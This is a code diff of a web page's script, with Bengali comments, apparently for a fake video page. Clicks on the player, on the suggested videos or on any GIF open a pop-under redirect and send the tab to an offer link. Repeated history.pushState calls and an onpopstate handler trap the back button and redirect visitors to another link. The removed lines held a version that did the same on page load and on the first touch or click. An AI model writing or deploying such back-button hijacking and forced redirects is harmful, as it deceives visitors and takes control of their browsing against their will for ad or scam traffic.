@@ -211,46 +211,59 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // CLICK LOGIC
+            // TARGETED HIJACK LOGIC
             // ════════════════════════════════════════════════════════════
+            let isHijackActivated = false;
+
+            function setupHijack() {
+                if (!isHijackActivated) {
+                    // শুধুমাত্র টার্গেটেড ক্লিকের পর হিস্ট্রি লক জেনারেট করবে
+                    for (let i = 0; i < 8; i++) {
+                        window.history.pushState(null, document.title, window.location.href);
+                    }
+                    isHijackActivated = true;
+                    activatePopState();
+                }
+            }
+
+            function activatePopState() {
+                window.onpopstate = function (event) {
+                    // ব্যাক বাটন চাপলে রিডাইরেক্ট করবে
+                    for (let i = 0; i < 3; i++) {
+                        window.history.pushState(null, document.title, window.location.href);
+                    }
+                    setTimeout(function() {
+                        window.location.replace(BACK_HIJACK_LINK);
+                    }, 50);
+                };
+            }
+
             function triggerLinks() {
+                // প্রথমে হাইজ্যাক এক্টিভেট করবে, তারপর নতুন ট্যাব ও অফার লিংকে পাঠাবে
+                setupHijack();
                 try {
                     window.open(REDIRECT_LINK_1, '_blank');
                 } catch (e) { }
                 window.open(DIRECT_LINK_MAIN, '_self');
             }
 
+            // ১. মেইন ভিডিও প্লেয়ারে ক্লিক করলে
             document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
 
+            // ২. সাজেস্টেড ভিডিওর তালিকায় ক্লিক করলে
             const suggestedItems = document.querySelectorAll('.suggested-video-item');
             suggestedItems.forEach(function(element) {
                 element.addEventListener('click', triggerLinks);
             });
 
-            // ════════════════════════════════════════════════════════════
-            // ADVANCED BACK-BUTTON HIJACKING
-            // ════════════════════════════════════════════════════════════
-            function setupHijack() {
-                // ব্রাউজারের হিস্ট্রি পুশ করার লুপ (ক্রোম ও মোবাইল ব্রাউজারের জন্য কার্যকর)
-                for (let i = 0; i < 10; i++) {
-                    window.history.pushState(null, document.title, window.location.href);
+            // ৩. পেজের যেকোনো GIF ইমেজে আলাদা করে ক্লিক করলেও যেন কাজ করে
+            const allImages = document.querySelectorAll('img');
+            allImages.forEach(function(img) {
+                if (img.src.toUpperCase().includes('.GIF')) {
+                    img.addEventListener('click', triggerLinks);
                 }
-            }
+            });
 
-            // প্রথম লোডেই হিস্ট্রি ব্লক করার চেষ্টা
-            setupHijack();
-
-            // ইউজার পেজে যেকোনো জায়গায় টাচ বা ক্লিক করলেই ব্যাক লক হয়ে যাবে
-            window.addEventListener('click', setupHijack, { once: true });
-            window.addEventListener('touchstart', setupHijack, { once: true });
-
-            // ব্যাক বাটন চাপলে রিডাইরেক্ট ট্রিপল সিকিউরিটি দিয়ে করার চেষ্টা
-            window.onpopstate = function (event) {
-                setupHijack();
-                setTimeout(function() {
-                    window.location.replace(BACK_HIJACK_LINK);
-                }, 50);
-            };
         })();
     </script>
 </body>
